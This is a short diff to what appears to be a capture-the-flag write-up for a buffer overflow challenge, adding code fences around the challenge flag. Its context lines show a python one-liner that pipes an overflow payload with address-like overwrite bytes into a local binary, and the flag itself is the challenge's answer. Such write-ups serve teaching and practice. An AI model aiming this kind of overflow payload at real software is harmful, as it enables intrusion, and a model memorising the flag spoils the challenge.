@@ -17,5 +17,6 @@ This is the second part of the buffer overflow challenge using the same C source
 python -c 'print("2\n" + "name\n" + "A"*128+"1234567\x81\n" + "3\n1\n" + "name\n" + "A"*128+"\xaf\x7d\xab\xc1\x33\xca\x00\n" + "1\n4")' | ./devices
 ```
 
+```
 NIXU{h0w_t0_d3al_w1th_null_byt3s\x00}
-
+```
